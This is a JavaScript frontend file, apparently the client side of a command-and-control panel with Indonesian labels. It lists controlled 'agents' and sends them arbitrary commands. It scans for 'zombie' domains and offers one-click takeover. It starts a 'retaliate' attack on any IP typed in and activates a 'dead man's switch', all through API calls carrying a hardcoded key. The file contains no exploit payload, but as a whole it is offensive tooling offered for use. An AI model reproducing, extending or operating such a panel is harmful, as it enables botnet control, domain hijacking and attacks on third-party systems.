// commander.js
window.onload = function() {
  loadAgents();
};

function loadAgents() {
  fetch('/api/agents?key=watcher123')
    .then(r => r.json())
    .then(data => {
      const select = document.getElementById('agent-select');
      select.innerHTML = '<option value="">Pilih Agent</option>';
      data.forEach(a => {
        const opt = document.createElement('option');
        opt.value = a.id;
        opt.textContent = a.id;
        select.appendChild(opt);
      });
    });
}

function sendCommand(cmd) {
  const id = document.getElementById('agent-select').value;
  if (!id) { alert("Pilih agent!"); return; }
  fetch('/api/command?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ agent_id: id, command: cmd })
  }).then(() => alert(`Perintah "${cmd}" dikirim`));
}

function scanZombie() {
  const keyword = document.getElementById('keyword').value;
  const results = document.getElementById('zombie-results');
  results.innerHTML = '🔍 Memindai...';
  fetch('/api/zombie/scan?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ keyword })
  }).then(r => r.json()).then(data => {
    results.innerHTML = data.map(z => `
      <div class="zombie-item">
        <b>🧟 ${z.domain}</b> (${z.status})<br>
        <button onclick="takeover('${z.domain}')">🚀 Ambil Alaih</button>
      </div>
    `).join('');
  });
}

function retaliate() {
  const ip = document.getElementById('retaliate-ip').value;
  if (!ip) { alert("Masukkan IP!"); return; }
  fetch('/api/retaliate?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ip })
  }).then(() => alert(`⚔️ Balas serangan ke ${ip} dimulai!`));
}

function openModal() { document.getElementById('switch-modal').style.display = 'block'; }
function closeModal() { document.getElementById('switch-modal').style.display = 'none'; }
function activateSwitch() {
  fetch('/api/deadman/activate?key=watcher123', { method: 'POST' })
    .then(() => { alert("DEAD MAN'S SWITCH AKTIF"); closeModal(); });
}